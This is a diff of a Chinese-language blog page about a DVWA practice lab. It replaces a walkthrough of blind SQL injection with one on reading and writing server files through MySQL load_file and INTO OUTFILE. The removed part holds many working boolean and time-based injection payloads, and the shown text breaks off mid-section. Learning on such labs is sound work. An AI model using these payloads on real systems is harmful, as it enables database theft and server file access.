@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title itemprop="name">SQL Injection2(Blind) | Kid</title>
+  <title itemprop="name">SQL Injection3(读取和上传文件文件) | Kid</title>
   
     <link rel="shortcut icon" href="/images/favicon.ico">
   
@@ -348,11 +348,11 @@
   
     <div class="pattern-center single-center">
       <!-- 有配图默认渲染第一张 -->
-      <div class="pattern-attachment-img lazyload" style="background-image: url(https://ws2.sinaimg.cn/large/006tNc79ly1g1ullewnlqj30u90l20vd.jpg);" src="/images/loader/orange.progress-bar-stripe-loader.svg" data-src="https://ws2.sinaimg.cn/large/006tNc79ly1g1ullewnlqj30u90l20vd.jpg">
+      <div class="pattern-attachment-img lazyload" style="background-image: url(https://ws1.sinaimg.cn/large/006tNc79ly1g1wtb7liqhj30rs0ijwkp.jpg);" src="/images/loader/orange.progress-bar-stripe-loader.svg" data-src="https://ws1.sinaimg.cn/large/006tNc79ly1g1wtb7liqhj30rs0ijwkp.jpg">
       </div>
       <header class="pattern-header single-header">
         <h1 class="entry-title">
-        SQL Injection2(Blind)</h1>
+        SQL Injection3(读取和上传文件文件)</h1>
         <p class="entry-census">
           <span>
             <a href="/">
@@ -364,7 +364,7 @@
           </span>
           <span class="bull">
           ·</span>
-          2019-4-8<span class="bull">
+          2019-4-9<span class="bull">
           ·</span>
         <span id="busuanzi_value_page_pv"></span>次阅读</p>
       </header>
@@ -377,225 +377,199 @@
         <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
         
         <div class="entry-content">
-          <h1 id="SQL-Injection2-Blind"><a href="#SQL-Injection2-Blind" class="headerlink" title="SQL Injection2(Blind)"></a>SQL Injection2(Blind)</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本篇文章主要来对SQL注入的盲注进行一个探讨学习，主要还是已dvwa靶场来进行实践</p>
-<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol>
-<li>判断数字型注入还是字符型注入</li>
-<li>获取数据库名（猜取数据库名长度-&gt;猜取数据库具体字符）</li>
-<li>获取表名（猜取表的张数-&gt;猜取表名的长度-&gt;猜取表名的具体字符）</li>
-<li>猜取字段名（猜取字段的数量-&gt;猜取具体字段的长度-&gt;采取具体字段的具体字符）</li>
-<li>猜取具体数据（猜取数据长度-&gt;猜取数据具体内容）</li>
+          <h1 id="SQL-Injection3-读取和上传文件文件"><a href="#SQL-Injection3-读取和上传文件文件" class="headerlink" title="SQL Injection3(读取和上传文件文件)"></a>SQL Injection3(读取和上传文件文件)</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前一篇文章在盲注查询资料的时候意外发现了一篇讲利用MySQL来进行读取和上传文件的博客，这里来实际操作一下</p>
+<h2 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h2><p>读取文件主要使用的是load_file文件</p>
+<p>查询了下load_file函数的使用条件主要有如下两个</p>
+<blockquote>
+<ol>
+<li><p>文件权限：chmod a+x pathtofile</p>
+</li>
+<li><p>文件大小: 必须小于max_allowed_packet</p>
+</li>
 </ol>
-<p>依据情况使用基于布尔的注入或基于时间的注入</p>
-<h2 id="dvwa练习"><a href="#dvwa练习" class="headerlink" title="dvwa练习"></a>dvwa练习</h2><p>LOW：</p>
-<p>这里讲布尔注入和时间注入都进行尝试下</p>
-<p>布尔注入（主要看返回的正确与否，所以都是用and连接）：</p>
-<p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1g1qst8amsuj30i8031a9x.jpg" alt="1"></p>
-<p>首先看图可以输入1后不再像前面SQL注入时返回用户名了，现在我们还是来测试下，是数字型注入还是字符型注入</p>
-<p>先测试字符型注入</p>
-<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1g1qstgca9fj30i3032t8l.jpg" alt="2"></p>
-<p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1g1qstmsb9kj30i3031dfq.jpg" alt="3"></p>
-<p>可以看到字符型注入是存在的</p>
-<p>但测试数字型注入的时候有点蒙蔽了，因为我认为测试结果应该是返回User ID is MISSING from database.但返回的却是User ID is exists from database</p>
-<p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1g1qsu0dm6gj30i3032mx1.jpg" alt="4"></p>
-<p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1g1qsu4kf5ij30i3032mx1.jpg" alt="5"></p>
-<p>确实这里想的不是很明白…理论上输入进去的东西应该查不出东西的啊，我有进入SQL注入试了下</p>
-<p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1g1qsudxdfrj30i303u0sm.jpg" alt="6"></p>
-<p>发现在字符型注入下输入的数字型注入依旧成功返回？？？好吧搜索了下,然后找到了下面的解释.</p>
-<blockquote>
-<p>这是sql的语法，因为没有加引号闭合，所以输入都被当做查询id，不会执行命令，这样说吧你输入1qwertyuiop跟输入1运行结果是一样的，</p>
 </blockquote>
+<p>ok，先直接在MySQL数据库以root用户尝试一下</p>
+<p>通过show VARIABLES like ‘%max_allowed_packet%’;命令查看下max_allowed_packet，</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1g1wsgayzuuj30h20470sn.jpg" alt="2"></p>
+<p>默认的是64M…   来测试一下</p>
+<p>在MySQL上创建一个flag文件，并调整它的权限设为可读</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1g1wsgjmvtoj30o503h0sr.jpg" alt="1"></p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1g1wsi72mjuj30f800k741.jpg" alt="3"></p>
+<p><code>select load_file(&#39;/var/lib/mysql/flag&#39;);</code></p>
+<p>用上面的语句来测试读取flag，结果并没有读出来…</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1g1wsifhv25j30fy03et8j.jpg" alt="4"></p>
+<p>查询ing… 发现有一个secure_file_priv参数</p>
 <blockquote>
-<p>强制类型转换</p>
+<p>secure_file_priv参数用于限制LOAD DATA, SELECT …OUTFILE, LOAD_FILE()传到哪个指定目录。</p>
+<p>secure_file_priv 为 NULL 时，表示限制mysqld不允许导入或导出。</p>
+<p>secure_file_priv 为 /tmp 时，表示限制mysqld只能在/tmp目录中执行导入导出，其他目录不能执行。</p>
+<p>secure_file_priv 没有值时，表示不限制mysqld在任意目录的导入导出。</p>
 </blockquote>
-<p>测试了下，id这个字段好像是比较特殊</p>
-<p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1g1qsupkuqoj30i202ka9u.jpg" alt="16"></p>
-<p>可以看到基本胡乱输入的字符串也被接受查询出来了，只要首位在id中就能查出来</p>
-<p>别的字段是不行的，可以看到下面用name字段来测试没有成功</p>
-<p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1g1qsuy0zocj30hy015a9u.jpg" alt="17"></p>
-<p>搜索的时候还发现了一篇不错的blog讲了利用SQL注入来下载和上传文件的方法</p>
-<p><a href="https://www.imbajin.com/web%E5%AE%89%E5%85%A8%E4%B9%8BDVWA%E3%81%AESQL%E6%B3%A8%E5%85%A5(%E5%85%AD" target="_blank" rel="noopener">web安全之DVWAのSQL注入(六)</a>/)</p>
-<p>先继续往下吧，判断出是字符型注入后我们按照套路应该尝试下获取数据库名字，但没有返回的字段所以我们只有不断的猜测，通过返回的正误来判断猜测的正确与否，这也就是所谓的布尔注入</p>
-<p>首先我们先来猜测名字的字符串长度，这时候发现SQL语法还是真的蛮强大，也有很多自带函数，比如这里用到的length</p>
-<p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1g1qsvr6uixj30i4035a9z.jpg" alt="7"></p>
-<p>好的，上面的1测试出来不对，我们继续向下进行测试，当然我觉得也可以用大于小于符号先判断下范围，要是那种名字超长的库，这样逐渐增加就太慢了特别是手工注入。OK，测试到4的时候返回ID存在，确定库名长为4</p>
-<p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1g1qsvwqil1j30i5033mx2.jpg" alt="8"></p>
-<p>下面我们就要开始猜解字段名了，幸好只有4位不算长…</p>
-<p>这里需要通过ascii码来进行比较，当然我测试了下不用ascii码直接用字符来比较也OK</p>
-<p>其次这里需要用到substr来一个一个提取字符</p>
-<p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1g1qsw4nkpoj30i4034mx2.jpg" alt="9"></p>
-<p>这里看到字符是大于’a’的，这里我们就不采用递增来推测，使用二分法来提高效率</p>
-<p><code>1&#39; and substr(database(),1,1)&gt;&#39;a&#39; #</code>  或者</p>
-<p><code>1&#39; and ascii(substr(database(),1,1))&gt;97 #</code> </p>
-<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1g1qypj5xahj30i70343yf.jpg" alt="10"></p>
-<p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1g1qypkygs0j30i0035747.jpg" alt="11"></p>
-<p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1g1qypnbqacj30i00333yf.jpg" alt="12"></p>
-<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1g1qypq380rj30i2031jra.jpg" alt="13"></p>
-<p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1g1qypsgdj0j30ia0323yf.jpg" alt="14"></p>
-<p>这里可以看到第一个字符大于c为真，小于d为假，所以第一个字符为d</p>
-<p>按照上面的方法依次可以试出后面三位是vwa</p>
-<p>这样我们就获得了数据库的文件名dvwa</p>
-<p>下面进行表名的猜解</p>
-<p>首先我们先判断这个数据库有几张表，这里用到了count这个方法</p>
-<p><code>1&#39; and (select count(table_name) from information_schema.tables where table_schema=database()) = 1#</code></p>
-<p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1g1qyqb67g0j30i7033jra.jpg" alt="15"></p>
-<p>可以看到在2的时候成功了，所以dvwa中有两张表</p>
-<p>然后我们来猜解表名长度 这里用到了limit <del>(limit m,n   m表示从第几条开始，初始值为0，n表示取几条)</del></p>
-<p>因为括号的问题下面的语句我在测试的时候一直失误查不出来，一度怀疑是自己这边用的是MySQL8.0的原因，改成MySQL5.7后发现还是不行，结果最后发现是括号少写了一个…<strong>请务必注意括号的匹配</strong> 这里用不用substr都行</p>
-<p><code>1&#39; and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)) = 1#</code></p>
-<p><code>1&#39; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=1 #</code></p>
-<p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1g1qyqk75zyj30qk07h0ss.jpg" alt="18"></p>
-<p>OK，就按照上面的方法来猜试，终于在试到9时对了<strong>（开个文本来写测试语句真的要方便很多）</strong></p>
-<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1g1qyqqoxpij30o005w3yt.jpg" alt="19"></p>
-<p>上面是第一张表的长度，同理按照上面的方法我们也可以猜试出第二张表的长度，不过这次是用比较的方法求得的，大于4正确，大于5错误，所以表名长度为5</p>
-<p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1g1qyqx8ylvj30nm05bt8z.jpg" alt="20"></p>
-<p>好的我们知道了表名长度，下面要做的就是试出具体的表名是什么了，方法和上面猜试数据库名的方法一样，这里注意逗号substr里因为少些了一个逗号一直返回错误的提示，也耽搁了好些时间</p>
-<p><code>1&#39; and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)&gt;&#39;a&#39; #</code></p>
-<p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1g1qyr9gctzj30i604s74g.jpg" alt="21"></p>
-<p>第一个字符最后是大于’f’小于’g’所以是’g’</p>
-<p>按照上述方法可以求得第一个表名是’guestbook’，第二个表名是’users‘</p>
-<p>知道了表名，我们下面就需要接着来求字段名了</p>
-<p>还是首先来猜取字段总数</p>
-<p><code>1&#39; and (select count(column_name) from information_schema.columns where table_name=&#39;user&#39; ) = 1#</code></p>
-<p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1g1qyrfzurmj30hw04wq33.jpg" alt="22"></p>
-<p>上面可以看到我是用大小来判断的，大于7正确大于8错误，所以有8个字段</p>
-<p>知道了有8个字段后就是依次来猜解字段名了，和上面知道表的数量来猜解表名基本类似</p>
-<p>先来猜解第一个字段名的长度,这里一定要注意括号数量select语句用括号括起来表示字段名，外面还有一层括号是length函数的括号</p>
-<p><code>1&#39; and length((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1))=1#</code></p>
-<p>下图可以看到第一个字段长度大于6的时候成功了，大于7的时候失败了，所以第一个字段的长度是7</p>
-<p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1g1qyrmhzaqj30i204sq33.jpg" alt="23"></p>
-<p>然后我们再来猜解第一个字段的的第一个字符是什么</p>
-<p>1’ and substr((select column_name from information_schema.columns where table_name=’users’ limit 0,1),1,1)&gt;’a’#</p>
-<p>ok，然后第一个字符试出来是大于’t’正确，大于’u’错误所以第一个字符试’u’</p>
-<p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1g1qyrtkdvqj30hv04xglr.jpg" alt="24"></p>
-<p>下面同理的方法进行猜解，就能将所有字段名破解出来…</p>
-<p>有了字段名，我们就可以用同样的方法来猜取里面的数据值了</p>
-<p>拿第一个字段来举例，第一个字段是’user_id’</p>
-<p>套路还是一样，先看user_id有多少数据</p>
-<p><code>1&#39; and length((select count(user_id) from users )) =1#</code></p>
-<p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1g1qyrz6zxwj30d7046aa3.jpg" alt="25"></p>
-<p>可以看到一个数据的长度就是1</p>
-<p>现在来猜解内容</p>
-<p><code>1&#39; and substr((select user_id from user limit 0,1),1,1)=&#39;0&#39;#</code></p>
-<p>然后我们成功猜解出来了第一个字段的第一个数据是1</p>
-<p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1g1qys5q9jsj30ft04ddfw.jpg" alt="26"></p>
-<p>依次类推我们就能猜解出所有数据……</p>
-<p>时间注入（主要用到sleep()函数，用if来做判断，猜对后sleep一定时间来进行判断）：</p>
-<p>先判断是字符型注入还是数字型注入</p>
-<p><code>1&#39; and sleep(5)#</code></p>
-<p><code>1 and sleep(5)#</code></p>
-<p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1g1qyscb8bzj30ft044dfv.jpg" alt="27"></p>
-<p>这里能明显感觉到上面的那条语句执行要慢很多，然后要注意的是sleep这个函数应该默认返回的flase</p>
-<p>在自己数据库测试了下确实是这样（但这里时间长度变为了3倍，后面试了5秒变成15秒…这是个什么道理有没有大佬解释下）</p>
-<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1g1qysj8ktmj30kd07yjrc.jpg" alt="28"></p>
-<p>下面就不截图了，毕竟时间这种东西不是截图能体现出来的…</p>
-<p>按照套路下面是获得数据库名</p>
-<p>先获取数据库长度</p>
-<p><code>1&#39; and if(length(database())=1,sleep(5),1)#</code></p>
-<p>这里要是感觉到明显延迟就说明猜测正确了</p>
-<p>4的时候明显感觉到了延迟所以数据库名长为4</p>
-<p>然后来猜解字段名</p>
-<p><code>1&#39; and if((substr(database(),1,1))&gt;&#39;a&#39;,sleep(5),1)#</code></p>
-<p>这里发现大于’c’的时候有明显延迟，大于’d’的时候没有推测出数据库名的第一个字符是’d’</p>
-<p>后面就依次的这样尝试，获得数据库名为‘dvwa’，</p>
-<p>有了数据库名了，就来获取当前数据库的表</p>
-<p>先获取表的数量</p>
-<p><code>1&#39; and if((select count(table_name) from information_schema.tables where table_schema=database())=1,sleep(5),1)#</code></p>
-<p>等于2的时候有明显延迟，OK获得表的数量是2</p>
-<p>然后来先获取第一张表表名的长度</p>
-<p><code>1&#39; and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=1,sleep(5),1)#</code></p>
-<p>好的当测到9的时候有明显延迟，第一张表的长度是9，同理测得第二张表的长度是5</p>
-<p>然后知道了长度当然就是来猜解表名了，这里已猜解第二张表的表名来演示</p>
-<p><code>1&#39; and if(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)&gt;&#39;a&#39;,sleep(5),1)#</code></p>
-<p>通过上面的字段测试出大于’u’没有明显的延时，大于’t’有明显的延时，所以第二张表的第一个字母是u，同理可以猜测出别的所有字符。</p>
-<p>这样就得到了两张表的表名’guestbook’，’users’</p>
-<p>有了表名自然而然下一步就是表中的字段名了</p>
-<p>还是先猜测字段的数量</p>
-<p><code>1&#39; and if((select count(column_name) from information_schema.columns where table_name=&#39;users&#39;)=1,sleep(5),1)#</code></p>
-<p>明显在8的时候有延迟，得到字段数为8</p>
-<p>有了数量当然就要开始依次猜测具体数值了</p>
-<p>先猜测users表的第一个字段的字段长</p>
-<p><code>1&#39; and if(length((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1))=7,sleep(5),1)#</code></p>
-<p>可以发现在7时，时间明显延长，所以第一个字段的字长为7</p>
-<p>然后我们就继续判断别的字段的字长</p>
-<p>知道每个字段的字长后就依次来猜解每个字段的字符</p>
-<p><code>1&#39; and if(substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),1,1 )&gt;&#39;t&#39;,sleep(5),1)#</code></p>
-<p>这里来可以发现大于t有延时，大于u没有延时所以users表的第一字段的第一个字符是u，同理可以推出别的字符。这样我们得到第一个字段为user_id，同理可以得到别的字段。有了字段名后我们就可以来猜解数据来。</p>
-<p>没错还是要靠猜，不过要合理的利用二分法等来提高效率</p>
-<p><code>1&#39; and if(length((select user_id from users limit 0,1))&gt;0,sleep(5),1)#</code></p>
-<p>先判断数据长度，发现长度是1，很开心有没有</p>
-<p>然后直接开猜</p>
-<p><code>1&#39; and if((select user_id from users limit 0,1)=1,sleep(5),1)#</code></p>
-<p>然后就判断出了第一个数据值为1</p>
-<p>这里没有用substr所以直接和1进行的比较，但我觉得最后还是带上substr这样可以起到一个类型转换的作用，就如下面的语句</p>
-<p><code>1&#39; and if(substr((select user_id from users limit 0,1),1,1)=&#39;1&#39;,sleep(5),1)#</code></p>
-<p>OK，这样low等级的盲注就算完成了</p>
-<p>MEDIUM:</p>
-<p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1g1u56iphroj310o0b4dgk.jpg" alt="image-20190407161907581"></p>
-<p>看样子盲注和sql注入的想要考察的点基本还是一样的，看到上面的下拉框很自然的想到了要截包来改数据了。因为基于布尔和基于时间的注入上面low级别已经演示了区别，下面就主要通过基于布尔的注入来进行操作</p>
-<p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1g1udzl6pvdj30yk0e0abe.jpg" alt></p>
-<p>基本与low级别一样主要是需要截包进行修改操作，如上图所示，但用low级别的方法来判断是字符型还是数字型好像没区别（暂时没想通为什么），但我用图中的的语句去尝试发现正常返回所以判断为数字型注入</p>
-<p>下面还是先获取数据库名（数据名长度然后数据库的名称）</p>
-<p><code>id=1 and length((database()))&gt;4&amp;Submit=Submit</code></p>
-<p>得到数据名长度为4</p>
-<p><code>id=1 and substr(database(),1,1)&gt;&#39;a&#39;&amp;Submit=Submit</code></p>
-<p><code>id=1 and ascii(substr(database(),1,1))&gt;97&amp;Submit=Submit</code></p>
-<p>这里因为有转义会把’’给转义掉，所以这里用ascii()函数把字符转为ascii码就可以了</p>
-<p>这样推出数据库名为dvwa</p>
-<p>下面来获取表名（表个数-&gt;各个表长度-&gt;表名）</p>
-<p><code>id=1 and (select count(table_name) from information_schema.tables where table_schema=database())&gt;1&amp;Submit=Submit</code></p>
-<p>获得表有两张（注意这里用的是count不是length）</p>
-<p><code>id=1 and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;1&amp;Submit=Submit</code></p>
-<p>这样我们获得第一张表长度为9第二张表长度为5</p>
-<p><code>id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;97&amp;Submit=Submit</code></p>
-<p>这样得到表名分别是guestbook和users</p>
-<p>下面来猜解字段名（字段个数-&gt;各个字段长度-&gt;字段名）</p>
-<p><code>id=1 and (select count(column_name) from information_schema.columns where table_name=0x7573657273)&gt;1&amp;Submit=Submit</code></p>
-<p>得到users有8个字段（这里注意表名用十六进制（每个字符的ascii转十六进制）因为’’符号会被转义）</p>
-<p><code>id=1 and length((select column_name from information_schema.columns where table_name=0x7573657273 limit 0,1))&gt;1&amp;Submit=Submit</code></p>
-<p>得到users表的第一个字段长度为7（依次可以推出其它字段长度）</p>
-<p><code>id=1 and ascii(substr((select column_name from information_schema.columns where table_name=0x7573657273 limit 0,1),1,1))&gt;97&amp;Submit=Submit</code></p>
-<p>得到第一个字符是u，同理能推出字段的其它字符</p>
-<p>下面就是推测具体数据了，先猜取数据的具体长度，然后再猜取具体内容</p>
-<p>HIGH：</p>
-<p>这里还是用基于布尔的方法来测试，但要说一下的是，这里的服务端在查询结果为空的时候会随机的sleep几秒中，这样会干扰布尔判断。</p>
-<p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1g1uh85cj1lj312c0gimy8.jpg" alt="30"></p>
-<p>注入的时候发现也是弹窗让输入，但输入正常值后 发现查询也失败，显示cookie被设置，那就只有先抓包看下了</p>
-<p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1g1uhcyjzusj316y0ecwg4.jpg" alt="31"></p>
-<p>这里可以发现它进行了url编码，但你服务端倒是解码啊…..发现在包中直接修改后不进行url编码反而能正常返回，emmm……不过这样也方便了我们手工注入，直接对包进行修改。</p>
-<p>试了下，这里只用改body的值就能正常查询了，cookie不改也行。这里的cookie是对应上次查询的值</p>
-<p>还是先判断是数字注入还是字符注入</p>
-<p>用low级别中的方法判断出，是字符型注入</p>
-<p>然后猜取数据库名（这里也明显感觉到了猜错后的随机延时）</p>
-<p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1g1uhvk8ayaj31ja0e0tai.jpg" alt="32"></p>
-<p>这样我们得到数据名长度为4</p>
-<p><code>1&#39; and substr((database()),1,1)&gt;&#39;a&#39;#</code></p>
-<p>得到表名第一个字符为’d’，同理可以推出其它字符</p>
-<p>有了数据库名后来获取表名</p>
-<p><code>1&#39; and (select count(table_name) from information_schema.tables where table_schema=database())&gt;1#</code></p>
-<p>得到有两张表</p>
-<p><code>1&#39; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;1#</code></p>
-<p>这样获取到各个表表名的长度</p>
-<p><code>1&#39; and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)&gt;&#39;a&#39;#</code></p>
-<p>这样可以获得第一张表的第一个字符名，同理可以推出完整的表名和所有表名</p>
-<p>下面就是获取字段名（和上面获取表名方法类似这里就不继续了）</p>
-<p>有了字段名后就可以来猜解里面的数据了</p>
-<p>这里HIGH级别里面还加入了limit的限制，但因为是字符型注入每次结尾都加入了#注释符所以没有任何影响。</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>整体做下来会发现前面的SQL注入主要是结合union来进行联合查询</p>
-<p>而盲注更多的是依据and操作来进行条件的判断来进行猜测，</p>
-<p>盲注这里常用ascii(),substr(),length(),if(),count等函数，但还是离不开对information_schema数据库的依赖</p>
-<p>还有就是盲注真的很考验耐心…工具确实是十分必要的，请期待后面的sqlmap的使用吧…</p>
-<h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><ol>
-<li><p>substr()函数，这个函数也是在MySQL中第一次用到，这个函数看名字就知道是用来提取子字符串的，在这里我们就需要它来提取出字符串中的每一个字符</p>
-<p>substr(string, start, length)这个函数需要3个参数，第1个是字符串本身，第2个是起始位置（需要注意的就是MySQL这里是从1开始的），length就是需要提取的长度，我们需要提取1位，所以这里都是填1</p>
+<p><code>show global variables like &#39;%secure_file_priv%&#39;;</code></p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1g1wsimi55pj30eb036web.jpg" alt="5"></p>
+<p>可以发现当前数据库的secure_file_priv的默认值为NULL</p>
+<p>这时候是不允许导入导出的</p>
+<p>这时候来修改这个值，发现这个值是只读的…</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1g1wsixgajfj30i0010t8i.jpg" alt="6"></p>
+<p>因为是在docker中使用的mysql所以先装个vim</p>
+<p><a href="https://blog.csdn.net/czhenjie/article/details/75452995" target="_blank" rel="noopener">docker 镜像下安装Vim</a>(这里注意echo后面不要用””，加了引号不行会报错) </p>
+<p>现在在my.cnf中增加secure_file_priv=’’</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1g1wsj2v43vj30gu022mwy.jpg" alt="7"></p>
+<p>重启docker，然后在来查看secure_file_priv的值发现已经修改为空了</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1g1wsjdoj96j30gn032web.jpg" alt="8"></p>
+<p>再来查看我们的flag文件，发现已经没有问题了，显示出了flag文件中的内容</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1g1wsjln7yhj30cl03lweb.jpg" alt="9"></p>
+<p>这时候来创建一个没有权限的文件，我们就会发现无法访问（没有权限无法访问很正常啊）</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1g1wsjsnydoj30ix00j0sh.jpg" alt="10"></p>
+<p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1g1wsjwvp2rj30fj036web.jpg" alt="11"></p>
+<p>这时候来修改权限调试，发现前面说文件权限：chmod a+x pathtofile是不对的，这里需要的是读权限而不是修改权限，只有修改权限也是无法读取到文件的</p>
+<p>其次因为这里使用root创建的文件，而我们用MySQL去读文件的时候是MySQL用户所以不是在文件拥有者那里添加读权限，而是在其它那里添加读权限</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1g1wsk4dhj9j30e100h3y9.jpg" alt="12"></p>
+<p>就如上面所示，添加了这个读权限后就能利用MySQL读取文件了</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1g1wskbfm5ej30iy04jmx0.jpg" alt="13"></p>
+<p>下面到dvwa的靶场尝试一下</p>
+<p>这里我们来尝试下获取MySQL的配置文件my.cnf因为这个路径一般不做修改的话都在/etc/mysql/下面</p>
+<p>这里登录dvwa的服务器查看下，确实是这样，然后文件所提供的权限也够</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1g1wslkhmkjj30hs05fwek.jpg" alt="14"></p>
+<p>但结果没有成功…</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1g1wslscxn5j30hx05iaa4.jpg" alt="15"></p>
+<p>然后我想会不会文件太大max_allowed_packet有限制，于是自己创建了一个文件</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1g1wsm4z15dj30hy066glq.jpg" alt="16"></p>
+<p>结果还是不行…</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1g1wsmhsytwj30ht05jjrg.jpg" alt="17"></p>
+<p>那我觉得应该是secure_file_priv的问题了，登录dvwa，修改了my.cnf，添加了secure_file_priv=’’</p>
+<p>结果还是没用？？？还是查不出来？？？</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1g1wsmo5fhoj30dp037dfp.jpg" alt="18"></p>
+<p>我看网上说主要还是文件权限问题？？？</p>
+<p>但这里已经把所有权限都给了啊（flag给成777试了下也没成功…）</p>
+<p>又看了下，这里难道是用户权限不够？</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1g1wsmup50qj30i4054jrj.jpg" alt="19"></p>
+<p>我在自己的MySQL环境下面测试了下，前面SQL注入时创建了一个只对test数据库有操作权限的test用户</p>
+<p>这里我们可以看到test1用户和root用户去load_file得到的是不同的结果</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1g1wsn1d15jj30hx08x0sv.jpg" alt="20"></p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1g1wsn5wihlj30hs09974f.jpg" alt="21"></p>
+<p>上面可以发现test1用户是得不到正确的结果的</p>
+<p>这里的dvwa的数据库操作来看，不能访问mysql.user表，说明也是做了权限的设置，所以前面的load_file()都没有成功。。。</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1g1wsnmr2qvj30ie03yq34.jpg" alt="22"></p>
+<p>上图可以看到当前的app用户确实没有权限</p>
+<p>后面重新再dvwa后台试着登录mysql，结果它说不知道secure_file_priv变量？？？</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1g1wsnua43tj30es00zmwy.jpg" alt="23"></p>
+<p>看了下数据库版本，是MariaDB10.1.26</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1g1wsnzyo0mj30i105h3yk.jpg" alt="24"></p>
+<p>去官方看了下secure_file_priv也没觉得有问题啊</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1g1wso6j2jxj30o605ljrw.jpg" alt="25"></p>
+<p>然后我把secure_file_pri=’’删掉</p>
+<p>后面登录了dvwa的root账户查看了secure_file_priv，发现是没有问题的啊</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1g1wsoeeby1j30f8035744.jpg" alt="33"></p>
+<p>好吧，现在我还是只能归结为用户权限不够所以无法读取文件…</p>
+<p>当然这是我自己做测试得到的结论，目前认为是这样，如果哪里不对还请大佬们多赐教（后面利用root账户提升app用户的权限后发现可以正常读取了，见下面上传文件部分）</p>
+<p><a href="https://blog.csdn.net/ncafei/article/details/54616826" target="_blank" rel="noopener">MySQL注入load_file常用路径</a>(这是load_file比较常用的文件路径)</p>
+<h2 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h2><p>这里主要是利用mysql导出文件的函数来实现的</p>
+<p>select  …  into outfile </p>
+<p>select … into dumpfile</p>
+<blockquote>
+<p>outfile函数可以导出多行，而dumpfile只能导出一行数据<br>outfile函数在将数据写到文件里时有特殊的格式转换，而dumpfile则保持原数据格式</p>
+</blockquote>
+<p>直接类尝试一下，报错权限不够，wtf</p>
